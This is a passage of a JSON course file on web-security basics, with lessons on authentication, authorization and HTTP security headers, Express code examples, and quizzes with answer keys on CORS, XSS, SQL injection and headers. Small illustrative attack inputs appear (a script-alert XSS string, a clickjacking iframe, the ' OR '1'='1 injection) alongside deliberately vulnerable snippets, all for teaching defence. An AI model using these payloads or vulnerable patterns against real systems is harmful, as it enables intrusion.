Mistakes\n\n‚ùå Storing passwords in plain text\n‚ùå Putting sensitive data in JWT\n‚ùå Not checking authorization after authentication\n‚ùå Trusting client-side role checks\n‚ùå Not expiring tokens\n‚ùå Weak password requirements",
      "codeExample": "// Complete Auth & Authz Example\n\nconst express = require('express');\nconst jwt = require('jsonwebtoken');\nconst bcrypt = require('bcrypt');\nconst app = express();\n\nconst SECRET = process.env.JWT_SECRET;\n\n// Authentication Middleware\nfunction authenticate(req, res, next) {\n  const authHeader = req.headers.authorization;\n  const token = authHeader?.split(' ')[1];  // \"Bearer <token>\"\n  \n  if (!token) {\n    return res.status(401).json({ error: 'Authentication required' });\n  }\n  \n  try {\n    const decoded = jwt.verify(token, SECRET);\n    req.user = decoded;  // { userId, email, role }\n    next();\n  } catch (error) {\n    res.status(401).json({ error: 'Invalid or expired token' });\n  }\n}\n\n// Authorization Middleware\nfunction authorize(...allowedRoles) {\n  return (req, res, next) => {\n    if (!allowedRoles.includes(req.user.role)) {\n      return res.status(403).json({ \n        error: 'Forbidden: Insufficient permissions' \n      });\n    }\n    next();\n  };\n}\n\n// Registration\napp.post('/register', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // Hash password\n  const passwordHash = await bcrypt.hash(password, 10);\n  \n  // Save user\n  const user = await db.createUser({ email, passwordHash, role: 'user' });\n  \n  res.json({ id: user.id, email: user.email });\n});\n\n// Login\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // Find user\n  const user = await db.findUserByEmail(email);\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  // Verify password\n  const valid = await bcrypt.compare(password, user.passwordHash);\n  if (!valid) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  // Create token\n  const token = jwt.sign(\n    { userId: user.id, email: user.email, role: user.role },\n    SECRET,\n    { expiresIn: '1h' }\n  );\n  \n  res.json({ token });\n});\n\n// Public route - no auth needed\napp.get('/api/posts', async (req, res) => {\n  const posts = await db.getPosts();\n  res.json(posts);\n});\n\n// Protected route - auth required\napp.get('/api/profile', authenticate, async (req, res) => {\n  const user = await db.getUser(req.user.userId);\n  res.json(user);\n});\n\n// Role-based route - admin only\napp.delete('/api/users/:id', \n  authenticate, \n  authorize('admin'), \n  async (req, res) => {\n    await db.deleteUser(req.params.id);\n    res.json({ success: true });\n  }\n);\n\n// Resource-based - owner or admin\napp.put('/api/posts/:id', authenticate, async (req, res) => {\n  const post = await db.getPost(req.params.id);\n  \n  // Check if user is owner or admin\n  const isOwner = post.authorId === req.user.userId;\n  const isAdmin = req.user.role === 'admin';\n  \n  if (!isOwner && !isAdmin) {\n    return res.status(403).json({ error: 'Cannot edit this post' });\n  }\n  \n  await db.updatePost(req.params.id, req.body);\n  res.json({ success: true });\n});\n\napp.listen(3000);"
    },
    {
      "id": "security-headers",
      "moduleId": "security-basics",
      "title": "Common Security Headers",
      "order": 5,
      "difficulty": "beginner",
      "content": "# Essential to know\n- HTTP headers can add security layers\n- Prevent common attacks (XSS, clickjacking, etc.)\n- Easy to implement with helmet.js\n- Defense in depth - use multiple headers\n\n---\n\n# Security Headers: Your First Line of Defense\n\n## What Are Security Headers?\n\n**HTTP headers** that tell browsers how to behave securely.\n\nExample:\n```http\nHTTP/1.1 200 OK\nContent-Security-Policy: default-src 'self'\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=31536000\n```\n\nThese headers protect against common attacks.\n\n## Essential Security Headers\n\n### 1. Content-Security-Policy (CSP)\n\n**Prevents XSS attacks** by controlling what resources can load.\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com\n```\n\n**What it does:**\n- Only load scripts from your domain and cdn.example.com\n- Blocks inline scripts (`<script>alert('xss')</script>`)\n- Blocks `eval()` and inline event handlers\n\n**Common directives:**\n```http\ndefault-src 'self';              # Default for all resources\nscript-src 'self' 'unsafe-inline';  # Scripts (avoid unsafe-inline!)\nstyle-src 'self' 'unsafe-inline';   # CSS\nimg-src 'self' data: https:;     # Images\nconnect-src 'self' https://api.example.com;  # fetch/XHR\nfont-src 'self' https://fonts.googleapis.com;\n```\n\n**Example:**\n```javascript\napp.use((req, res, next) => {\n  res.setHeader(\n    'Content-Security-Policy',\n    \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\"\n  );\n  next();\n});\n```\n\n### 2. X-Frame-Options\n\n**Prevents clickjacking** by controlling if your site can be embedded in iframes.\n\n```http\nX-Frame-Options: DENY\n```\n\n**Options:**\n- `DENY` - Cannot be framed at all\n- `SAMEORIGIN` - Only your own site can frame it\n- `ALLOW-FROM https://example.com` - Specific domain (deprecated)\n\n**Attack prevented:**\n```html\n<!-- evil-site.com -->\n<iframe src=\"https://yourbank.com/transfer\">\n<!-- Invisible overlay to trick clicks -->\n```\n\nWith `X-Frame-Options: DENY`, this iframe is blocked.\n\n### 3. Strict-Transport-Security (HSTS)\n\n**Forces HTTPS** - browser always uses HTTPS, even if user types `http://`\n\n```http\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n\n**What it does:**\n- `max-age=31536000` - Remember for 1 year\n- `includeSubDomains` - Apply to all subdomains\n- `preload` - Include in browser's HSTS preload list\n\n**Attack prevented:**\n- Man-in-the-middle on insecure HTTP\n- SSL stripping attacks\n\n### 4. X-Content-Type-Options\n\n**Prevents MIME sniffing** - browser must respect declared Content-Type.\n\n```http\nX-Content-Type-Options: nosniff\n```\n\n**Attack prevented:**\n```\nYou upload \"image.jpg\" containing JavaScript.\nWithout nosniff: Browser might execute it as JavaScript.\nWith nosniff: Browser treats it as image only.\n```\n\n### 5. Referrer-Policy\n\n**Controls how much referrer information is sent.**\n\n```http\nReferrer-Policy: strict-origin-when-cross-origin\n```\n\n**Options:**\n- `no-referrer` - Never send referrer\n- `same-origin` - Only for same-origin requests\n- `strict-origin-when-cross-origin` - Full URL for same-origin, origin only for cross-origin\n\n**Why it matters:**\nURLs might contain sensitive info:\n```\nhttps://example.com/reset-password?token=secret123\n```\n\nWithout policy, this token is sent in Referer header!\n\n### 6. Permissions-Policy\n\n**Controls which browser features can be used.**\n\n```http\nPermissions-Policy: geolocation=(), microphone=(), camera=()\n```\n\n**Disable features you don't use:**\n```http\nPermissions-Policy: geolocation=(self), microphone=(), camera=(), payment=()\n```\n\nPrevents malicious scripts from accessing camera/mic.\n\n### 7. X-XSS-Protection (Deprecated but still useful)\n\n**Enables browser's XSS filter.**\n\n```http\nX-XSS-Protection: 1; mode=block\n```\n\n**Note:** Modern browsers use CSP instead, but this adds defense in depth.\n\n## Implementing with Helmet.js\n\n**Helmet** sets secure headers automatically:\n\n```javascript\nconst helmet = require('helmet');\nconst app = express();\n\n// Basic usage - sets multiple security headers\napp.use(helmet());\n```\n\n**Custom configuration:**\n```javascript\napp.use(\n  helmet({\n    contentSecurityPolicy: {\n      directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\"'self'\", \"https://cdn.example.com\"],\n        styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n        imgSrc: [\"'self'\", \"data:\", \"https:\"],\n        connectSrc: [\"'self'\", \"https://api.example.com\"]\n      }\n    },\n    hsts: {\n      maxAge: 31536000,\n      includeSubDomains: true,\n      preload: true\n    },\n    frameguard: {\n      action: 'deny'\n    },\n    referrerPolicy: {\n      policy: 'strict-origin-when-cross-origin'\n    }\n  })\n);\n```\n\n## Testing Your Headers\n\n**Online tools:**\n- https://securityheaders.com\n- https://observatory.mozilla.org\n\n**Check headers in browser:**\n1. Open DevTools ‚Üí Network\n2. Click on a request\n3. View Response Headers\n\n## Complete Example\n\n**Secure headers setup:**\n```javascript\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\n// Set security headers\napp.use(\n  helmet({\n    contentSecurityPolicy: {\n      directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\"'self'\"],\n        styleSrc: [\"'self'\", \"'unsafe-inline'\"],  // For styled-components\n        imgSrc: [\"'self'\", \"data:\", \"https:\"],\n        connectSrc: [\"'self'\", \"https://api.myapp.com\"],\n        fontSrc: [\"'self'\", \"https://fonts.gstatic.com\"],\n        objectSrc: [\"'none'\"],\n        upgradeInsecureRequests: []\n      }\n    },\n    hsts: {\n      maxAge: 31536000,\n      includeSubDomains: true\n    },\n    frameguard: { action: 'deny' },\n    noSniff: true,\n    referrerPolicy: { policy: 'strict-origin-when-cross-origin' }\n  })\n);\n\napp.get('/', (req, res) => {\n  res.send('Hello with secure headers!');\n});\n\napp.listen(3000);\n```\n\n## Security Headers Checklist\n\n‚úÖ Content-Security-Policy (CSP)\n‚úÖ Strict-Transport-Security (HSTS)\n‚úÖ X-Frame-Options\n‚úÖ X-Content-Type-Options\n‚úÖ Referrer-Policy\n‚úÖ Permissions-Policy\n‚úÖ X-XSS-Protection (legacy)\n\n## Best Practices\n\n‚úÖ Use helmet.js for easy setup\n‚úÖ Test headers with securityheaders.com\n‚úÖ Start with strict CSP, relax only if needed\n‚úÖ Always use HSTS in production\n‚úÖ Review headers regularly\n‚úÖ Monitor CSP violations",
      "codeExample": "// Complete security headers setup\n\nconst express = require('express');\nconst helmet = require('helmet');\nconst app = express();\n\n// Option 1: Use helmet with all defaults (good starting point)\napp.use(helmet());\n\n// Option 2: Customize helmet (recommended for production)\napp.use(\n  helmet({\n    // Content Security Policy\n    contentSecurityPolicy: {\n      directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\n          \"'self'\",\n          \"https://cdn.jsdelivr.net\",  // CDN for libraries\n          \"https://www.google-analytics.com\"  // Analytics\n        ],\n        styleSrc: [\n          \"'self'\",\n          \"'unsafe-inline'\",  // Allow inline styles (for React)\n          \"https://fonts.googleapis.com\"\n        ],\n        imgSrc: [\n          \"'self'\",\n          \"data:\",  // Base64 images\n          \"https:\"   // Any HTTPS image\n        ],\n        connectSrc: [\n          \"'self'\",\n          \"https://api.myapp.com\",\n          \"https://www.google-analytics.com\"\n        ],\n        fontSrc: [\n          \"'self'\",\n          \"https://fonts.gstatic.com\"\n        ],\n        objectSrc: [\"'none'\"],\n        mediaSrc: [\"'self'\"],\n        frameSrc: [\"'none'\"],\n        upgradeInsecureRequests: []  // Upgrade HTTP to HTTPS\n      },\n      reportOnly: false  // Set to true for testing\n    },\n    \n    // HTTP Strict Transport Security\n    hsts: {\n      maxAge: 31536000,  // 1 year\n      includeSubDomains: true,\n      preload: true\n    },\n    \n    // Prevent clickjacking\n    frameguard: {\n      action: 'deny'  // or 'sameorigin'\n    },\n    \n    // Prevent MIME sniffing\n    noSniff: true,\n    \n    // Referrer policy\n    referrerPolicy: {\n      policy: 'strict-origin-when-cross-origin'\n    },\n    \n    // Permissions policy\n    permissionsPolicy: {\n      features: {\n        geolocation: [\"'self'\"],\n        microphone: [\"'none'\"],\n        camera: [\"'none'\"],\n        payment: [\"'none'\"]\n      }\n    }\n  })\n);\n\n// Option 3: Manual headers (if not using helmet)\napp.use((req, res, next) => {\n  // CSP\n  res.setHeader(\n    'Content-Security-Policy',\n    \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\"\n  );\n  \n  // HSTS\n  res.setHeader(\n    'Strict-Transport-Security',\n    'max-age=31536000; includeSubDomains; preload'\n  );\n  \n  // X-Frame-Options\n  res.setHeader('X-Frame-Options', 'DENY');\n  \n  // X-Content-Type-Options\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  \n  // Referrer-Policy\n  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n  \n  // X-XSS-Protection (legacy)\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  \n  next();\n});\n\n// CSP violation reporting endpoint\napp.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {\n  console.log('CSP Violation:', req.body);\n  res.status(204).end();\n});\n\napp.get('/', (req, res) => {\n  res.send('<h1>Secure site with proper headers!</h1>');\n});\n\napp.listen(3000, () => {\n  console.log('Server running with security headers');\n});"
    }
  ],
  "exercises": [
    {
      "id": "security-ex-1",
      "lessonId": "cors-explained",
      "moduleId": "security-basics",
      "title": "CORS Scenarios",
      "difficulty": "medium",
      "description": "Identify which requests will be blocked by CORS.",
      "instructions": "Determine if each scenario will be blocked by CORS policy.",
      "type": "quiz",
      "questions": [
        {
          "question": "Frontend at http://localhost:3000 requests http://localhost:4000. CORS blocks this?",
          "options": ["Yes, blocked", "No, allowed"],
          "correctAnswer": 0,
          "explanation": "Different ports = different origins. CORS will block unless the backend allows localhost:3000."
        },
        {
          "question": "Frontend at https://myapp.com requests https://myapp.com/api. CORS blocks this?",
          "options": ["Yes, blocked", "No, allowed (same origin)"],
          "correctAnswer": 1,
          "explanation": "Same protocol, domain, and port = same origin. No CORS needed!"
        },
        {
          "question": "Frontend at https://myapp.com requests https://api.myapp.com. CORS blocks this?",
          "options": ["Yes, different subdomain", "No, same domain"],
          "correctAnswer": 0,
          "explanation": "Different subdomains are different origins. CORS headers required."
        },
        {
          "question": "What header must the server send to allow cross-origin requests?",
          "options": [
            "Access-Control-Allow-Origin",
            "Allow-Origin",
            "CORS-Allow",
            "X-Allow-Origin"
          ],
          "correctAnswer": 0,
          "explanation": "Access-Control-Allow-Origin tells browsers which origins are allowed."
        },
        {
          "question": "Is using 'Access-Control-Allow-Origin: *' with credentials safe?",
          "options": [
            "Yes, it's fine",
            "No, it's a security risk and browsers block it"
          ],
          "correctAnswer": 1,
          "explanation": "You cannot use '*' with credentials: true. It's a security violation."
        }
      ]
    },
    {
      "id": "security-ex-2",
      "lessonId": "xss-prevention",
      "moduleId": "security-basics",
      "title": "Identify XSS Vulnerabilities",
      "difficulty": "medium",
      "description": "Spot the XSS vulnerabilities in code examples.",
      "instructions": "Identify which code snippets are vulnerable to XSS.",
      "type": "quiz",
      "questions": [
        {
          "question": "Is this React code vulnerable to XSS?\n\nfunction Comment({ text }) {\n  return <div>{text}</div>;\n}",
          "options": ["Yes, vulnerable", "No, safe"],
          "correctAnswer": 1,
          "explanation": "React automatically escapes content in {}, preventing XSS."
        },
        {
          "question": "Is this code vulnerable to XSS?\n\ndiv.innerHTML = userInput;",
          "options": ["Yes, vulnerable", "No, safe"],
          "correctAnswer": 0,
          "explanation": "innerHTML with user input is highly vulnerable. User can inject <script> tags."
        },
        {
          "question": "Is this code vulnerable to XSS?\n\ndiv.textContent = userInput;",
          "options": ["Yes, vulnerable", "No, safe"],
          "correctAnswer": 1,
          "explanation": "textContent treats everything as text, never executes HTML/JavaScript."
        },
        {
          "question": "Best way to allow users to use bold/italic formatting safely?",
          "options": [
            "Allow all HTML tags",
            "Use innerHTML with raw input",
            "Sanitize with DOMPurify and whitelist safe tags",
            "Just escape everything"
          ],
          "correctAnswer": 2,
          "explanation": "DOMPurify sanitizes HTML, allowing only whitelisted safe tags while removing dangerous code."
        },
        {
          "question": "What does Content-Security-Policy header help prevent?",
          "options": [
            "SQL injection",
            "XSS attacks",
            "CORS errors",
            "Broken authentication"
          ],
          "correctAnswer": 1,
          "explanation": "CSP helps prevent XSS by controlling which scripts can run on your page."
        }
      ]
    },
    {
      "id": "security-ex-3",
      "lessonId": "sql-injection",
      "moduleId": "security-basics",
      "title": "SQL Injection Prevention",
      "difficulty": "medium",
      "description": "Identify vulnerable SQL code and how to fix it.",
      "instructions": "Determine which code is vulnerable to SQL injection.",
      "type": "quiz",
      "questions": [
        {
          "question": "Is this vulnerable to SQL injection?\n\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\ndb.query(query);",
          "options": ["Yes, vulnerable", "No, safe"],
          "correctAnswer": 0,
          "explanation": "String interpolation with user input is vulnerable. Use parameterized queries instead."
        },
        {
          "question": "Is this safe from SQL injection?\n\nconst query = 'SELECT * FROM users WHERE id = $1';\ndb.query(query, [userId]);",
          "options": ["Yes, safe", "No, vulnerable"],
          "correctAnswer": 0,
          "explanation": "Parameterized query with $1 placeholder is safe. Database treats it as data, not SQL."
        },
        {
          "question": "An attacker enters: admin' OR '1'='1\nWhat happens without parameterized queries?",
          "options": [
            "Query fails with error",
            "Returns the admin user",
            "Could bypass login or return all users",
            "Nothing, input is automatically escaped"
          ],
          "correctAnswer": 2,
          "explanation": "The OR '1'='1' makes the condition always true, bypassing authentication or returning all records."
        },
        {
          "question": "Best way to prevent SQL injection?",
          "options": [
            "Escape all user input manually",
            "Use parameterized queries/prepared statements",
            "Only allow alphanumeric characters",
            "Don't accept user input"
          ],
          "correctAnswer": 1,
          "explanation": "Parameterized queries separate SQL code from data, preventing injection attacks."
        },
        {
          "question": "Are ORMs like Prisma or Sequelize safe from SQL injection?",
          "options": [
            "No, they're just as vulnerable",
            "Yes, they use parameterized queries internally",
            "Only if you manually escape input",
            "Depends on the database"
          ],
          "correctAnswer": 1,
          "explanation": "ORMs use parameterized queries internally, providing automatic SQL injection protection."
        }
      ]
    },
    {
      "id": "security-ex-4",
      "lessonId": "auth-vs-authz",
      "moduleId": "security-basics",
      "title": "Authentication vs Authorization Quiz",
      "difficulty": "easy",
      "description": "Test your understanding of auth concepts.",
      "instructions": "Answer questions about authentication and authorization.",
      "type": "quiz",
      "questions": [
        {
          "question": "What is authentication?",
          "options": [
            "Checking what permissions a user has",
            "Verifying who the user is (login)",
            "Encrypting passwords",
            "Logging user actions"
          ],
          "correctAnswer": 1,
          "explanation": "Authentication = verifying identity (WHO are you?). Usually done with login credentials."
        },
        {
          "question": "What is authorization?",
          "options": [
            "Logging in",
            "Hashing passwords",
            "Checking what a user is allowed to do",
            "Signing JWT tokens"
          ],
          "correctAnswer": 2,
          "explanation": "Authorization = checking permissions (WHAT can you do?). Happens after authentication."
        },
        {
          "question": "A user logs in successfully but tries to access admin panel. Server returns 403. Why?",
          "options": [
            "Authentication failed",
            "User is not logged in",
            "Authorization failed - user lacks permission",
            "Server error"
          ],
          "correctAnswer": 2,
          "explanation": "User is authenticated (logged in) but not authorized (lacks admin permission). Hence 403 Forbidden."
        },
        {
          "question": "Which status code means 'not logged in'?",
          "options": [
            "401 Unauthorized",
            "403 Forbidden",
            "400 Bad Request",
            "404 Not Found"
          ],
          "correctAnswer": 0,
          "explanation": "401 means not authenticated (should be 'Unauthenticated' but named Unauthorized for historical reasons)."
        },
        {
          "question": "Best practice for storing passwords in database?",
          "options": [
            "Plain text",
            "Encrypted (reversible)",
            "Hashed with bcrypt/argon2 (one-way)",
            "Base64 encoded"
          ],
          "correctAnswer": 2,
          "explanation": "Hash passwords with bcrypt or argon2. One-way hashing means you can't retrieve the original password."
        }
      ]
    },
    {
      "id": "security-ex-5",
      "lessonId": "security-headers",
      "moduleId": "security-basics",
      "title": "Security Headers Quiz",
      "difficulty": "easy",
      "description": "Test your knowledge of security headers.",
      "instructions": "Answer questions about HTTP security headers.",
      "type": "quiz",
      "questions": [
        {
          "question": "What does Content-Security-Policy (CSP) help prevent?",
          "options": [
            "SQL injection",
            "XSS attacks",
            "Slow performance",
            "CORS errors"
          ],
          "correctAnswer": 1,
          "explanation": "CSP prevents XSS by controlling which scripts, styles, and resources can load."
        },
        {
          "question": "What does X-Frame-Options: DENY prevent?",
          "options": [
            "XSS attacks",
            "SQL injection",
            "Clickjacking (site embedded in malicious iframe)",
            "Slow loading"
          ],
          "correctAnswer": 2,
          "explanation": "X-Frame-Options prevents your site from being embedded in iframes, protecting against clickjacking."
        },
        {
          "question": "What does Strict-Transport-Security (HSTS) do?",
          "options": [
            "Forces HTTPS, never allows HTTP",
            "Blocks XSS attacks",
            "Validates user input",
            "Compresses responses"
          ],
          "correctAnswer": 0,
          "explanation": "HSTS tells browsers to always use HTTPS, even if user types http://"
        },
        {
          "question": "Easiest way to set security headers in Express?",
          "options": [
            "Manually write all headers",
            "Use helmet.js package",
            "Configure nginx",
            "No easy way"
          ],
          "correctAnswer": 1,
          "explanation": "helmet.js automatically sets multiple security headers with one line: app.use(helmet())"
        },
        {
          "question": "Should you use 'unsafe-inline' in CSP script-src?",
          "options": [
            "Yes, always",
            "Avoid if possible - it weakens XSS protection",
            "Only in production",
            "Doesn't matter"
          ],
          "correctAnswer": 1,
          "explanation": "unsafe-inline allows inline scripts, which weakens CSP's XSS protection. Use nonces or external scripts instead."
        }
      ]
    }
  ]
}
